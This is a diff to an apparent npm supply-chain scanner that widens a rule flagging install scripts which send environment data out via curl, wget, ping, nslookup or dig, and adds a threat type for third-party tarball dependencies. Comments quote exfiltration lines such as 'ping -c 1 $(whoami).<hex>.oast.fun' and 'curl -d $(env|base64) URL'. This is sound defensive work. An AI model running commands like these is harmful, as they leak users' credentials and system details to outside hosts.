@@ -119,15 +119,17 @@ async function scanPackageJson(targetPath) {
       // v2.10.89: curl/wget + env/base64 exfiltration in lifecycle scripts
       // Catches: apache-arrow-14 (score 9→CRITICAL), @signals-notebook (score 9→CRITICAL)
       // Pattern: curl -d $(env|base64) URL, curl -X POST URL?env=$(env|base64 -w0)
+      // v2.10.94: extended to ping/nslookup/dig/host/getent — DNS exfil variants.
+      // Catches: koa-v3@9.4.0 which uses `ping -c 1 $(whoami).<hex>.oast.fun` instead of curl.
       if (['preinstall', 'install', 'postinstall'].includes(scriptName) &&
-          /\b(curl|wget)\b/.test(scriptContent) &&
+          /\b(curl|wget|ping|nslookup|dig|host|getent)\b/.test(scriptContent) &&
           (/\$\(.*\b(env|id|whoami|uname|hostname)\b/.test(scriptContent) ||
            (/\bbase64\b/.test(scriptContent) && !/\|\s*(sh|bash)\b/.test(scriptContent)))) {
         // Exclude curl|sh which is already caught by lifecycle_shell_pipe
         threats.push({
           type: 'curl_env_exfil',
           severity: 'CRITICAL',
-          message: `Critical: "${scriptName}" uses curl/wget with env/base64 exfiltration — credential theft via lifecycle script.`,
+          message: `Critical: "${scriptName}" uses DNS/HTTP exfil tool (curl/wget/ping/nslookup/dig) with env/base64 payload — credential theft via lifecycle script.`,
           file: 'package.json'
         });
       }
@@ -355,8 +357,13 @@ async function scanPackageJson(targetPath) {
         note = ' (unusual, verify source)';
       }
 
+      // v2.10.94: External tarball on third-party host emits a distinct type
+      // so MT-1 score ceiling (caps non-lifecycle, non-HC packages at 35) can be
+      // bypassed via HIGH_CONFIDENCE_MALICE_TYPES. ltidi stubs have no install
+      // hooks, so the dep URL is the only signal and must be HC-classified.
+      const threatType = isExternalTarball ? 'external_tarball_dep' : 'dependency_url_suspicious';
       threats.push({
-        type: 'dependency_url_suspicious',
+        type: threatType,
         severity,
         message: `Dependency "${depName}" uses HTTP URL: ${depVersion}${note}`,
         file: 'package.json'
